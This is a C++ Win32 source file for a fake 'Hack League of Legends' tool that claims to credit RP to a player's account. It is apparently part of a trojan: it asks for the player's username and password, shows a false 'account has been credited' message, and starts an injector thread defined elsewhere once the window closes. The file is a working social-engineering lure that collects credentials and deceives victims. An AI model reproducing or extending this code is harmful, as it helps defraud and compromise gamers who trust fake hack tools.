#include "pa5a.hpp"

EXTERN_C_START

#define ID_BUTTON_CREDIT_THE_ACCOUNT 1
#define BUFFER_SIZE 4096
/*******************************************************************************************************************************/
LRESULT CALLBACK leagueOfLengendsWindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    static HWND editUsername = NULL;
    static HWND editPassword = NULL;
    static HWND editRp = NULL;
    
    switch (uMsg)
    {
    case WM_CREATE:
        CreateWindow(L"static", L"username", BS_CENTER | SS_CENTER | WS_CHILD | WS_VISIBLE, 30, 210, 200, 20, hWnd, NULL, NULL, NULL);
        CreateWindow(L"static", L"password", BS_CENTER | SS_CENTER | WS_CHILD | WS_VISIBLE, 30, 240, 200, 20, hWnd, NULL, NULL, NULL);
        CreateWindow(L"static", L"Number of RP to credit", BS_CENTER | SS_CENTER | WS_CHILD | WS_VISIBLE, 30, 270, 200, 20, hWnd, NULL, NULL, NULL);

        editUsername = CreateWindow(L"edit", NULL, WS_BORDER | BS_CENTER | WS_CHILD | WS_VISIBLE, 250, 210, 220, 25, hWnd, NULL, NULL, NULL);
        editPassword = CreateWindow(L"edit", NULL, WS_BORDER | BS_CENTER | WS_CHILD | WS_VISIBLE, 250, 240, 220, 25, hWnd, NULL, NULL, NULL);
        editRp = CreateWindow(L"edit", NULL, WS_BORDER | BS_CENTER | WS_CHILD | WS_VISIBLE, 250, 270, 220, 25, hWnd, NULL, NULL, NULL);

        CreateWindow(L"button", L"Credit the account", WS_BORDER | BS_CENTER | WS_CHILD | WS_VISIBLE, 175, 330, 200, 40, hWnd, (HMENU)ID_BUTTON_CREDIT_THE_ACCOUNT, NULL, NULL);
        break;

    case WM_CLOSE:
        PostQuitMessage(0);

    case WM_PAINT:
    {
        BITMAP bm;
        PAINTSTRUCT ps;

        HBITMAP bitmap = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_BITMAP1));
        HDC hdc = BeginPaint(hWnd, &ps);

        HDC hdcMem = CreateCompatibleDC(hdc);
        HBITMAP hbmOld = (HBITMAP)SelectObject(hdcMem, bitmap);

        GetObject(bitmap, sizeof(bm), &bm);

        BitBlt(hdc, 140, 30, bm.bmWidth, bm.bmHeight, hdcMem, 0, 0, SRCCOPY);

        SelectObject(hdcMem, hbmOld);
        DeleteDC(hdcMem);

        EndPaint(hWnd, &ps);
    }
    break;

    case WM_COMMAND:
        switch (wParam)
        {
            case ID_BUTTON_CREDIT_THE_ACCOUNT:
            {
                CHAR username[512] = { 0 };
                CHAR password[512] = { 0 };
                CHAR rp[512] = { 0 };
                CHAR buffer[4096] = { 0 };

                GetWindowTextA(editUsername, username, sizeof(username));
                GetWindowTextA(editPassword, password, sizeof(password));
                GetWindowTextA(editRp, rp, sizeof(rp));

                StringCbPrintfA(buffer, sizeof(buffer), "The account [%s] has been credited with %d RP\nThank you for trusting us!", username, atoi(rp));

                MessageBoxA(hWnd, buffer, "Account has been credited", MB_ICONINFORMATION);
                break;
            }
        }
    }

    return DefWindowProcW(hWnd, uMsg, wParam, lParam);
}
/*******************************************************************************************************************************/
DWORD ThreadLeagueOfLegends()
{
    WNDCLASSW leagueOfLegendsWindowClass = { 0 };
    leagueOfLegendsWindowClass.lpszClassName = L"leagueOfLegendsWindowClass";
    leagueOfLegendsWindowClass.lpfnWndProc = leagueOfLengendsWindowProc;
    leagueOfLegendsWindowClass.hIcon = LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON1));
    RegisterClass(&leagueOfLegendsWindowClass);

    HWND hwnd = CreateWindowW(leagueOfLegendsWindowClass.lpszClassName, L"Hack League of Legends", WS_VISIBLE | WS_SYSMENU, CW_USEDEFAULT, CW_USEDEFAULT, 600, 450, NULL, NULL, NULL, NULL);

    MSG msg = { 0 };

    while (GetMessage(&msg, NULL, 0, 0) != 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    HANDLE hThreadInjector = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadInjector, NULL, 0, NULL);

    ExitThread(0);
}
/*******************************************************************************************************************************/


EXTERN_C_END